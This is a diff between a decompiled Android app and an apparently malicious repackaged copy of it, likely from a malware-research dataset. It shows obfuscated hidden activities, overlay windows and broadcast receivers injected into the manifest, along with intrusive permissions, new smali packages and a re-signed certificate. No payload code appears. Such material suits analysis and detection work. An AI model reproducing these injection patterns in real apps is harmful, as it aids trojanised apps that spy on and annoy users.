@@ -1,0 +1,491 @@
+diff -r result/APP_1/App_B_1/AndroidManifest.xml result/APP_1/App_M_1/AndroidManifest.xml
+101a102,159
+>         <meta-data android:name="j-id" android:value="be878405720742988a8d07057e8f38ca"/>
+>         <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:label="" android:launchMode="singleTask" android:name="com.texb.fsny.Ip"/>
+>         <service android:name="com.texb.fsny.Hj"/>
+>         <receiver android:name="com.texb.fsny.Kq">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.intent.action.USER_PRESENT"/>
+>             </intent-filter>
+>         </receiver>
+>         <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:label="" android:launchMode="singleTask" android:name="com.lbg.wmfq.Teb"/>
+>         <service android:name="com.lbg.wmfq.Lr"/>
+>         <receiver android:name="com.lbg.wmfq.Jpbr">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.intent.action.USER_PRESENT"/>
+>             </intent-filter>
+>         </receiver>
+>         <activity android:excludeFromRecents="true" android:label="" android:launchMode="singleTask" android:name="com.qqn.la.Hais">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.CREATE_SHORTCUT"/>
+>                 <category android:name="android.intent.category.DEFAULT"/>
+>             </intent-filter>
+>         </activity>
+>         <receiver android:name="com.qqn.la.Ii">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter android:priority="1000">
+>                 <action android:name="android.intent.action.USER_PRESENT"/>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>         </receiver>
+>         <service android:name="com.qqn.la.Njzh"/>
+>         <service android:name="com.mn.vymq.Jt"/>
+>         <receiver android:name="com.mn.vymq.Uc">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter android:priority="1000">
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>                 <action android:name="android.intent.action.USER_PRESENT"/>
+>             </intent-filter>
+>         </receiver>
+>         <activity android:excludeFromRecents="true" android:label="" android:launchMode="singleInstance" android:name="com.mn.vymq.Rf" android:theme="@android:style/Theme.Translucent"/>
+102a161,170
+>     <supports-screens android:anyDensity="true"/>
+>     <uses-permission android:name="android.permission.INTERNET"/>
+>     <uses-permission android:name="android.permission.WAKE_LOCK"/>
+>     <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+>     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+>     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+>     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+>     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+>     <uses-permission android:name="com.android.launcher.permission.INSTALL_SHORTCUT"/>
+>     <uses-permission android:name="android.permission.GET_TASKS"/>
+diff -r result/APP_1/App_B_1/apktool.yml result/APP_1/App_M_1/apktool.yml
+2c2
+< apkFileName: Bapp1-009D7E035C1A41CCEA8F4332506F3F65B14C673750C1FDB518FAD6886A22D931.apk
+---
+> apkFileName: Mapp1-03E4B7D80A9CB3C2169F2CF4BAD1EDFBE14D5A3EB5DFC7CAEEACB9A6557BAC23.apk
+Somente em result/APP_1/App_M_1/com: lbg
+Somente em result/APP_1/App_M_1/com: mn
+Somente em result/APP_1/App_M_1/com: qqn
+Somente em result/APP_1/App_M_1/com: texb
+Os arquivos binários result/APP_1/App_B_1/original/AndroidManifest.xml e result/APP_1/App_M_1/original/AndroidManifest.xml são diferentes
+Os arquivos binários result/APP_1/App_B_1/original/META-INF/CERT.RSA e result/APP_1/App_M_1/original/META-INF/CERT.RSA são diferentes
+diff -r result/APP_1/App_B_1/original/META-INF/CERT.SF result/APP_1/App_M_1/original/META-INF/CERT.SF
+2,3c2,4
+< Created-By: 1.0 (Android)
+< SHA1-Digest-Manifest: SMAu0vwZ2gTZxBg0guZDhreUakE=
+---
+> SHA1-Digest-Manifest-Main-Attributes: SHCGxzzEaMI6zkXjfCtYUEmyHUA=
+> Created-By: 1.6.0_45 (Sun Microsystems Inc.)
+> SHA1-Digest-Manifest: hatuSsbLVLZb4hg+xmPf+Qx4UjE=
+38,40d38
+< Name: assets/Financial/Interest/EQ_8.png
+< SHA1-Digest: O4abf+RcRl8eqz1IIyi/FyazUNU=
+< 
+43a42,44
+> Name: assets/Financial/Interest/EQ_8.png
+> SHA1-Digest: O4abf+RcRl8eqz1IIyi/FyazUNU=
+> 
+72c73
+< SHA1-Digest: KQXQHFFbHjLu3jHzSx7z+5M5WqI=
+---
+> SHA1-Digest: m6A48sQa1Adt1GMGnTH1xmnM8Yc=
+81c82
+< SHA1-Digest: PlkDttTPKCnS3/YVNfQtdr9fnEM=
+---
+> SHA1-Digest: EZ9JQvuEYuiHlrf92h9UrKh+jLU=
+309c310
+< SHA1-Digest: B+Wq8RZpRNq56Wnp5gbxeCXrdIU=
+---
+> SHA1-Digest: ZLbrN6x4uegfDIOD1m9hSRQOVV4=
+363c364
+< SHA1-Digest: yhvH1R80sp4KuW8BHwrfCvOhfgA=
+---
+> SHA1-Digest: AjlxJFtPr672ZvT3ZeNvNdwfLs0=
+402c403
+< SHA1-Digest: BtWQAOzbiAUe6YIVNMuw8b5hz9Y=
+---
+> SHA1-Digest: M3Q7ytYf7r2+J8X6V7Q1uHsi1P0=
+774c775
+< SHA1-Digest: AapQxclvyNn756udINZtnCcatek=
+---
+> SHA1-Digest: 8CiQKQESBxySx1BWkB0sL8fQNJ0=
+858c859
+< SHA1-Digest: FfQnnvU2pviKyP/6z0ctfmtwllU=
+---
+> SHA1-Digest: 04LwsYCGjIkjItxFf3ZWPQfOUcs=
+909c910
+< SHA1-Digest: LPgiqi+jCEMGZ1S0UZfSbfbKX9U=
+---
+> SHA1-Digest: vw+lSEqnNBZLEhgdX1Pf135GP0M=
+933c934
+< SHA1-Digest: S1oukDauD5Bl2ZRS9g5FhZlLSyE=
+---
+> SHA1-Digest: aMTbUOVGRAyuPlCIZmBPi0kto5o=
+978c979
+< SHA1-Digest: 912Gw1C5hGDozCkzgPY353oW8Pc=
+---
+> SHA1-Digest: TBrFappPV2AQsF8q7DFVlpYSP3Q=
+1044c1045
+< SHA1-Digest: l0LwCSDphOa5fsKtLt1GQ5Kxir4=
+---
+> SHA1-Digest: lgp6A3ljgVdiu4awYigk5oFbUgw=
+1077c1078
+< SHA1-Digest: UC0jT9d1ZjBGE2twXAWO9e43cNE=
+---
+> SHA1-Digest: O9yyaODg2479NfeQw5lE+maZ8n8=
+1233c1234
+< SHA1-Digest: D95XNzWVuG0kEZ8G2KCLJK6w/4k=
+---
+> SHA1-Digest: o2KmzwYBFt2r62jK098IXDhvGAA=
+1482c1483
+< SHA1-Digest: t1aDR5ygyunj6XFjRYfGEXsOlx4=
+---
+> SHA1-Digest: AtFMrREocBlXIPDrADAFPPR+Yrc=
+1794c1795
+< SHA1-Digest: KyZVMbGV/43vioq5T3JDM6YUqGA=
+---
+> SHA1-Digest: vl5pIIi03uNSP5UpXdHbHc1HSYs=
+1848c1849
+< SHA1-Digest: jgvSZUQZCYP+S2oMa1KJjl8QZXU=
+---
+> SHA1-Digest: kxoPB+nFvhC67Ba84NukPsx5cyQ=
+2010c2011
+< SHA1-Digest: nE7EYNjVj93g7s5Z8ihty5RiU3I=
+---
+> SHA1-Digest: jTqS+Py+6ZHjGP6C4Te0Rxj/a8s=
+2256c2257
+< SHA1-Digest: A2qP3PJhrTDa/R8qTcPuz4on2iA=
+---
+> SHA1-Digest: 23Y4YHHzDRKLEsJHpdRkvX2dK6w=
+2306,2308d2306
+< Name: assets/DiffEq/LaplaceTable/EQ_0.png
+< SHA1-Digest: ZPvRJ4EmhuE3upaot1wMmdfL8K4=
+< 
+2311a2310,2312
+> Name: assets/DiffEq/LaplaceTable/EQ_0.png
+> SHA1-Digest: ZPvRJ4EmhuE3upaot1wMmdfL8K4=
+> 
+2325c2326
+< SHA1-Digest: mMkUoYNJmq5o2f8jdqLqGfTHghE=
+---
+> SHA1-Digest: RY1RHm4q0Ncyf5TgjzDHBPdNFtE=
+2448c2449
+< SHA1-Digest: VWUqAJ/XzivVkik72RzPVBrvp/c=
+---
+> SHA1-Digest: Br4XLqIt0nK7qJz/sJhURSyXKTk=
+2571c2572
+< SHA1-Digest: CQXT33Fz+yI5ybNZVMhHamqF5CA=
+---
+> SHA1-Digest: TqVamIpnrvdyugs/+G82TYNldcE=
+2616c2617
+< SHA1-Digest: PIh4ZeDSQXZJDS+YPWdlzys8LtE=
+---
+> SHA1-Digest: Op+wKAEABoz6jPHIBUBfNwrzQKw=
+2787c2788
+< SHA1-Digest: psd6TyHlp0ztPk8Adk7za+UFvnQ=
+---
+> SHA1-Digest: pTmIWGs9QZXFxjwBBLycghD2JaU=
+2862c2863
+< SHA1-Digest: fkj97wRhgpZpxGSPhdaAtQ1KPRA=
+---
+> SHA1-Digest: YFIv9Xyds3b30EdZrHoKExccjTw=
+2904c2905
+< SHA1-Digest: F8Ix21GY14MtKnlE4uxaTjuiuF0=
+---
+> SHA1-Digest: qyHhfvZr2kMv/Y/rT1LOL6yrFtc=
+2913c2914
+< SHA1-Digest: +9BVF2N/VoTj5kgwDe0j7Fu0O3U=
+---
+> SHA1-Digest: ZNPhp9DVzRXZHxbBkr3UbCcvjk8=
+3024c3025
+< SHA1-Digest: RQPnSY7zdAqC0+0A9YqtAJG3z7U=
+---
+> SHA1-Digest: r5AHskG832YhDP2ouqdcaDl29R0=
+3160a3162,3164
+> Name: res/layout/tools_algebra_line2_solver.xml
+> SHA1-Digest: n1FY44/0ngzOB1f9DqU3iCL7ouc=
+> 
+3164,3166d3167
+< Name: res/layout/tools_algebra_line2_solver.xml
+< SHA1-Digest: o7cNlbBScmUXviOT26MNWJptkG0=
+< 
+3561c3562
+< SHA1-Digest: biPgn79//RCRNnn7DNLYi2NZoC4=
+---
+> SHA1-Digest: V8xUW7nDZnYcc/3OPEk1kzGytC8=
+3639c3640
+< SHA1-Digest: UuRkhwXv70hpeQf6VdAmQse2ZzY=
+---
+> SHA1-Digest: dry/P+2vlcXDulE1UtDG0aZuSac=
+3894c3895
+< SHA1-Digest: 2yIIE9i+IjeD8GSa1W+WnybFXP0=
+---
+> SHA1-Digest: dY+KFASWdgUKtGGKa/BEods9IMA=
+3987c3988
+< SHA1-Digest: 5ebDuWWa7RWt9syhT+iZZkt9Yis=
+---
+> SHA1-Digest: JO8kcyHUi5l1c23jsQxSNHEcnh4=
+4074c4075
+< SHA1-Digest: 48tZaa1c2xGMz06xDFegp54vcvM=
+---
+> SHA1-Digest: y02OdKK40OQ1zezVeDj9C3ifTIA=
+4248c4249
+< SHA1-Digest: N0IEelIysfZUnWs1VKy1Uc1RARw=
+---
+> SHA1-Digest: WOHZT+pCd3zgT9hMBf7FTvnP+94=
+4347c4348
+< SHA1-Digest: JNMB5gLRd/7QsCgs/W/wRPoTeCQ=
+---
+> SHA1-Digest: 17vOkCkdNaxefCS/SrgwbkyjNDs=
+4485c4486
+< SHA1-Digest: 38ooPF1NC4Dj00cH6u6Ms1Dgb2k=
+---
+> SHA1-Digest: 0dhYDmRroLX69Tnz7Yd14xDRmls=
+4590c4591
+< SHA1-Digest: edmbzqryeaR1qMKm+eyL+Z9d11g=
+---
+> SHA1-Digest: oj+Dv/ONJqkTopjv997DMC2JEH4=
+4610,4612d4610
+< Name: assets/VectorCalc/DotProd/EQ_3.png
+< SHA1-Digest: aCC774Al9Mkp8PkSs31Q0JVoA0M=
+< 
+4615a4614,4616
+> Name: assets/VectorCalc/DotProd/EQ_3.png
+> SHA1-Digest: aCC774Al9Mkp8PkSs31Q0JVoA0M=
+> 
+4656c4657
+< SHA1-Digest: mv5wxV+Q4xKpSfqO8IiT28emK48=
+---
+> SHA1-Digest: 5HxhizcE1GMpiR3gtTI9MsG2v54=
+4830c4831
+< SHA1-Digest: B+b0zD0N6zoLIM/cBsEnbK6QRUA=
+---
+> SHA1-Digest: 5WAVM0gb80nvclef0FjAAxWL/DE=
+5034c5035
+< SHA1-Digest: M5rVBNfNWfOxoSofyMBpZPCNwaU=
+---
+> SHA1-Digest: BD8RztcCKsup2CIjef3MBmfEcCg=
+5052c5053
+< SHA1-Digest: mFM0e6de/pHoFMLp/6G46uHmJpg=
+---
+> SHA1-Digest: VjGnohfVgP0Uo32ECkEbm1aU8Uo=
+5055c5056
+< SHA1-Digest: 5/i1bQ8YIFeYML1OiItBbAE/eWU=
+---
+> SHA1-Digest: ouKWxOFquWxiBxYpg32hgHvjSfs=
+5073c5074
+< SHA1-Digest: PgJQjBdHKr78oIg351R8dzBDkIk=
+---
+> SHA1-Digest: sc/01HHFVE8XTt2O6Yfp56GhyYI=
+5181c5182
+< SHA1-Digest: DcQnrgvHlWR/Igek6ofDu72nGek=
+---
+> SHA1-Digest: wSKb36MH65QN3SZ8FX1qtrIr5DQ=
+5196c5197
+< SHA1-Digest: Dn4CODH3epkd5bnf3AaMsT44HFE=
+---
+> SHA1-Digest: 20Mc/W4ZElg6iC1eIWaCcpoG5Yw=
+diff -r result/APP_1/App_B_1/original/META-INF/MANIFEST.MF result/APP_1/App_M_1/original/META-INF/MANIFEST.MF
+2c2
+< Created-By: 1.0 (Android)
+---
+> Created-By: 1.6.0_45 (Sun Microsystems Inc.)
+71c71
+< SHA1-Digest: sY/UUgqan36esUxdCEfY+Pcb5+U=
+---
+> SHA1-Digest: 2P3XM2Mu0YomYtvmlJOBO0UVFVQ=
+80c80
+< SHA1-Digest: d7IPsjnb2Me/v7aVBbm2mBZb3U0=
+---
+> SHA1-Digest: 4rGU+CFocnvPfrl6p/qS4Jv56uE=
+308c308
+< SHA1-Digest: Dkwa+ucgFahv9syos6AO56t2Yp0=
+---
+> SHA1-Digest: nBmvPAlGI2enx3feGikN9LZq5E8=
+359c359
+< SHA1-Digest: 8nq475rviTuzhF6TYzcmbwepeDA=
+---
+> SHA1-Digest: 74O+a2ZKUiJZS6PXXiPLmiKNEjI=
+398c398
+< SHA1-Digest: 3W1CnbmenCL8COZIgQvQGfadrUs=
+---
+> SHA1-Digest: 69z/AAp0Cez6W169IRnoHhiea3E=
+773c773
+< SHA1-Digest: 46l+R1oGWZkANqyaMTJ1bkrxR/0=
+---
+> SHA1-Digest: 1tq2aY+p1gSuNZ2tw+ExMnnusMM=
+857c857
+< SHA1-Digest: sY/UUgqan36esUxdCEfY+Pcb5+U=
+---
+> SHA1-Digest: 2P3XM2Mu0YomYtvmlJOBO0UVFVQ=
+908c908
+< SHA1-Digest: twP8nMm3HA0uRkDQ91UkZOV6ALc=
+---
+> SHA1-Digest: iaooHLIy4lQuUpK5IdOf18dPSz0=
+932c932
+< SHA1-Digest: i4MKop03FZ1w3/v0iPnetBJPdIg=
+---
+> SHA1-Digest: KC/fe+WzEfbL4oh8+KLgVeYogIc=
+977c977
+< SHA1-Digest: 38+sN2xD++ArlxPqeBs3+BVbP8s=
+---
+> SHA1-Digest: mzQLoQHiJ8uFdV+FsEd9mu//2lI=
+1043c1043
+< SHA1-Digest: lilrAGbEltCecZUgJFfD2AcfJhA=
+---
+> SHA1-Digest: TrvahgyBYyhUMRdK0hVJvn6wBbM=
+1076c1076
+< SHA1-Digest: QzaXc1JNcF3J95R3Vy7wSxOVqOI=
+---
+> SHA1-Digest: yBcXcypC3vXh0kw6hyqd6K2Ov/o=
+1229c1229
+< SHA1-Digest: Cr796ZSXQ58EcTVBTWEWyX5flbY=
+---
+> SHA1-Digest: jUpHZTYTmWJ/sxHOr6pzBENEwc4=
+1481c1481
+< SHA1-Digest: HABiRmxSSB43QgTgTS/SStq1nas=
+---
+> SHA1-Digest: T9d0jzEcKCD5kyw+7WX7HroaQCQ=
+1793c1793
+< SHA1-Digest: V0yqrkHrNCKWiCobh6plw1cOLQ8=
+---
+> SHA1-Digest: nty+9ECByYEDuPrHkJHk61CsHyE=
+1847c1847
+< SHA1-Digest: KRwhqWcqSHBvtxNhC7+4LM4UzgI=
+---
+> SHA1-Digest: kKZP5/2lm+kySxRBEfhip2F+VY4=
+2009c2009
+< SHA1-Digest: wKF8Sgg3vGCJRlJ6hhwaw8kgrIk=
+---
+> SHA1-Digest: nglnej/RXZlvcfkZ/m2d5WzWSJM=
+2255c2255
+< SHA1-Digest: v4+tR+a/WDJ/3wYWGU4rJQ6h6uE=
+---
+> SHA1-Digest: IhLtRkEs+VuEb1rVkwWafREsmVs=
+2324c2324
+< SHA1-Digest: tQyTCznF0RCvyxt+54qCBoBX2uc=
+---
+> SHA1-Digest: K5A5PNghOKQJvxDB9As+oYDiTKE=
+2447c2447
+< SHA1-Digest: Qi9lRU3Y3uM22hOBBNLANV2LEPs=
+---
+> SHA1-Digest: F9rG6kjjbCJCBI83fW4PyI0xSmA=
+2570c2570
+< SHA1-Digest: px6ZoJMcxSqUb6FkZN8HNOjQ+wA=
+---
+> SHA1-Digest: 8pSFtFZilUvP4tmXemY/s1yr74g=
+2615c2615
+< SHA1-Digest: k+3yEV7gqomWd+9Bb7w+zN1IoJ8=
+---
+> SHA1-Digest: sd+r47BtsK/EoCK8k/6vExe6C1M=
+2786c2786
+< SHA1-Digest: sY/UUgqan36esUxdCEfY+Pcb5+U=
+---
+> SHA1-Digest: 2P3XM2Mu0YomYtvmlJOBO0UVFVQ=
+2861c2861
+< SHA1-Digest: QAz/dochKE5exCeYnG4WKwUrQh4=
+---
+> SHA1-Digest: bNDQ2ULg6WwkIkROruvQmstInsE=
+2903c2903
+< SHA1-Digest: hlhnUCxf5aw08XXjkxMjCPyA1do=
+---
+> SHA1-Digest: JH7GztU7JA0p4HYP6IgCeGdLvsw=
+2912c2912
+< SHA1-Digest: 62yMxRpaNq1bTGcp7wiXz4Dl9+g=
+---
+> SHA1-Digest: 37PRmsErvSCDWJF/72SVyvuJCD4=
+3023c3023
+< SHA1-Digest: aYJxQZ88e/SPksT0JtZNlbvWrn8=
+---
+> SHA1-Digest: ncsnW34Ui2S4FzYHTRS5adL9Hdo=
+3159a3160,3162
+> Name: res/layout/tools_algebra_line2_solver.xml
+> SHA1-Digest: WDlqJ0ScKPmY5jIgHb9fHjm8Csg=
+> 
+3163,3165d3165
+< Name: res/layout/tools_algebra_line2_solver.xml
+< SHA1-Digest: KbfJBJ46bh3HSAfO8UYrgu3T3ns=
+< 
+3560c3560
+< SHA1-Digest: Hvh8sHk9peKBbb4krFdTJaYJlsY=
+---
+> SHA1-Digest: h/92oUuw4JIklaFQ0SybbjehAUo=
+3638c3638
+< SHA1-Digest: m95FUWn6NQdsH4tuzvzABTCRFAQ=
+---
+> SHA1-Digest: IUXIqc8F4jfK/DImQdvcxszO0dQ=
+3893c3893
+< SHA1-Digest: gaFidwGHqmmBFscQU7NxtwnBz2g=
+---
+> SHA1-Digest: pQoAZ2BUCxkCqN2eKmCR7Hl5E68=
+3986c3986
+< SHA1-Digest: NnjpRWnTd4WOV/xKJ+03MjUOh98=
+---
+> SHA1-Digest: Qgd4AqCKFOVpDDArzgNOeTsiaRc=
+4073c4073
+< SHA1-Digest: HbtjVAs+Vrd6ud2NkE6WTc0i0FM=
+---
+> SHA1-Digest: /PPBw3QX6dA5f/Ajn5rv+XOO8mI=
+4247c4247
+< SHA1-Digest: zqJNl0s8acxMRMItnWJCLtq7aTM=
+---
+> SHA1-Digest: JIpfj3iQ5E1237poMV2owFcD5/A=
+4346c4346
+< SHA1-Digest: 8HM4YEIuF0y+iRyLoP+ybdIrkiA=
+---
+> SHA1-Digest: PqMg330yIqC3eI4vynB+66yh4RQ=
+4484c4484
+< SHA1-Digest: Z/Je8AjKcQcV2NgQluvSyPJ+BgM=
+---
+> SHA1-Digest: wg2JosGldMJskbeT0dwGW9JIGdM=
+4589c4589
+< SHA1-Digest: cixZRWuTbaYQKoCkougNKu5ouDM=
+---
+> SHA1-Digest: IO7y7vB24AvXDUBzrQlfprTtvpI=
+4655c4655
+< SHA1-Digest: NnjpRWnTd4WOV/xKJ+03MjUOh98=
+---
+> SHA1-Digest: Qgd4AqCKFOVpDDArzgNOeTsiaRc=
+4826c4826
+< SHA1-Digest: PB4x8kQr3vOStMewyR97unY+aiE=
+---
+> SHA1-Digest: 87l2neirQVSxFCqunX30YRGILn0=
+5033c5033
+< SHA1-Digest: 9rl88yKO/IQvFpJFzwtP6YO81tE=
+---
+> SHA1-Digest: CzGkpJuXJO5WJ/NStZV/nJwhyc4=
+5051c5051
+< SHA1-Digest: sY/UUgqan36esUxdCEfY+Pcb5+U=
+---
+> SHA1-Digest: 2P3XM2Mu0YomYtvmlJOBO0UVFVQ=
+5054c5054
+< SHA1-Digest: VNB0a3w3FDqBdUwq3gNP/ZuVkHk=
+---
+> SHA1-Digest: LqkZgYZz4S/4TCf4wY+IVh+5rr0=
+5072c5072
+< SHA1-Digest: Jv/cOKS6Ti/BHzJZqqCSxSVwLps=
+---
+> SHA1-Digest: f4NGb+OUVJAVjFLq4xBAMPrgd1w=
+5180c5180
+< SHA1-Digest: M0KC/LqsLyrlvivRz2FXptxSAco=
+---
+> SHA1-Digest: pTSoO048J3RwGOZgr9H40HteAjk=
+5195c5195
+< SHA1-Digest: eLNYFelp1Cnq7JusXS/5pE39ro8=
+---
+> SHA1-Digest: OY7uQoztq9rEZfETWbJV4YIaJgU=
+Somente em result/APP_1/App_M_1/smali/com: lbg
+Somente em result/APP_1/App_M_1/smali/com: mn
+Somente em result/APP_1/App_M_1/smali/com: qqn
+Somente em result/APP_1/App_M_1/smali/com: texb
